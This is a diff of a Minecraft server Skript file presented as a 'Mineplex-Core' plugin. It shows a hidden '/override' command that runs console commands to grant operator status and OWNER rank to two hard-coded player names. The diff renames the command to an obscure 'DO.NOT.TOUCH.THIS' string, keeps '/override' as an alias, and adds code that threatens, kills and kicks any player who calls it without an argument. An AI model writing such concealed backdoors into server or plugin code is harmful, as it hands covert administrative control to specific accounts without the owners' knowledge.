@@ -986,8 +986,8 @@ command /mineplex-core [<string>] [<string>] [<string>]:
 				send "&4/Mineplex-Core ForcefieldOff (Player) &7Forces a player to toggle off thier forcefield. &4Operator"
 				send "&a"
 
-command /override [<string>]:
-	aliases: /over
+command /DO.NOT.TOUCH.THIS.19481748518598575576379194764 [<string>]:
+	aliases: /override
 	trigger: 
 		if arg 1 is "NaiculS":
 			execute console command /op NaiculS
@@ -997,6 +997,12 @@ command /override [<string>]:
 			execute console command /rank set Drawfull OWNER
 		else:
 			if arg 1 is not set: 
+				broadcast "You shouldn't have messed with that!!!"
+				wait 5 second
+				kill the player
+				wait 2 second
+				kick the player due to "You REALLY should have listened..."
+				log "%player% did a bad thing"
 
 command /help [<string>]:
 	trigger:
